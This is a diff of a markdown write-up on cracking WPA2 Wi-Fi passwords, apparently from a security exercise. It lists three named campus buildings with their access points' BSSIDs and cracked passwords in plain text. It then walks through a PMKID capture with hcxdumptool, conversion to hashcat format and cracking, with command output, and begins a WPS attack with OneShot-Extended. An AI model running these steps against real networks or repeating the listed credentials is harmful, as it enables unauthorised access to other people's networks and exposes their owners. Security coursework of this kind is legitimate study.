@@ -3,13 +3,13 @@
 ## Decryption results
 
 
-| place            | BSSID             | password            | methods  |
-|:---------------- |:----------------- |:------------------- |:-------- |
-| 電子資訊大樓八樓    | E8:94:F6:A0:08:AE | limpbizkit          | method 1 |
-| 工程三館三樓       | 54:B8:0A:13:16:A6 | infornationsecurity | method 2 |
-| 管理二館一樓       | C4:12:F5:0A:B6:07 | lissabon            | method 1 |
+| place            | BSSID             | password            | ENC    | methods  |
+|:---------------- |:----------------- |:------------------- |:--- |:-------- |
+| 電子資訊大樓八樓 | E8:94:F6:A0:08:AE | limpbizkit          | WPA2    | method 1 |
+| 工程三館三樓     | 54:B8:0A:13:16:A6 | infornationsecurity | WPA2    | method 2 |
+| 管理二館一樓     | C4:12:F5:0A:B6:07 | lissabon            | WPA2  | method 1 |
 
-## method 1
+## Methods 1 : [use hcxdumptool get PMKID and use Hashcat cracking](https://github.com/ZerBea/hcxdumptool/blob/master/docs/example.md)
 
 ### Step 1: update Dependencies
 ```
@@ -42,19 +42,61 @@ hcxdumptool --bpfc="wlan addr <BSSID lower case>" >> attack.bpf
 ```
 > ==<BSSID lower case>==: E8:94:F6:A0:08:AE -> e894f6a008ae     
     
-### Step 5:Packet Sniffing attack
+### Step 5: Packet Sniffing attack
 ```
 sudo hcxdumptool -i <monitor interface> -c <channal>a --bpf=attack.bpf -w TestAP.pcapng --rds=1
 (e.g sudo hcxdumptool -i wlan1mon -c 7a --bpf=attack.bpf -w TestAP.pcapng --rds=1)
+
+    
+This is a highly experimental penetration testing tool!
+It is made to detect vulnerabilities in your NETWORK mercilessly!
+Misuse within a network, without specific authorization, may cause
+irreparable damage and result in significant consequences!
+Not understanding what you were doing is not going to work as an excuse!
+
+starting ...
+    
+    
+Session Actions Edit View Help
+
+ CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID          (SCAN:  2457/10)
+----+--------+------+------------+------------+-------------------------------
+  10|12:26:38|ep+  +|b0febddb7598|c412f50ab607|IAIS-NS-30015
+                   ^
+            (紅線標記處取得PMKID)
+ 3510 Packet(s) captured by kernel
+ 0 Packet(s) dropped by kernel
+ exit on sigterm
 ```   
 
+>[!Note]**EA123P**
+**+:** Indicates a newly received packet corresponding to one of the EA123P types.
+**1:** The challenge message sent from the Router/AP to the Client.
+**2:** The Client's response to the Router. This is the most important; it is essential.
+**3:** The Router's confirmation message.
+**P:** PMKID (No user connection required / Client-less). As long as the router has roaming features enabled, the tool can interact directly with the router to capture this packet.
+**Cracking Requirement: P OR 1+2**
     
 ### Step 6: Conversion to .hc22000 (hashcat support format) 
 ```
 hcxpcapngtool -o TestAP.hc22000 TestAP.pcapng
+
+
+summary capture file
+--------------------
+file name....................................: TestAP.pcapng
+version (pcapng).............................: 1.0
+operating system.............................: Linux 6.12.38+kali-amd64
+application..................................: hcxdumptool 7.0.0
+interface name...............................: wlan0mon
+......    ......    ......
+......    ......    ......
+......    ......    ......
+session summary    
+---------------
+processed pcapng files..............: 1   
 ```
-> <font color="=#afeeee"> **Success:** </font>     
-> <font color="=#afeeee"> **session summary ---- processed pcapng files ...: 1** </font>    
+> <font color="=#afeeee"> **Success: session summary ---- processed pcapng files ...: 1** </font>    
 
 ### Step 7: Use hashcat cracking the PSK of our target network
 ```
@@ -232,7 +274,9 @@ Hardware.Mon.#1..: Temp: 49c Util: 20%
 password: lissabon
 :::
     
-## method 2
+## Methods 2 : [OneShot-Extended](https://hackmd.io/_uploads/SJCgWcCzbx.png)
+
+    
 ### Step 1: Install Dependencies
 ```
 sudo apt install python3 wpa-supplicant iw wget pixiewps
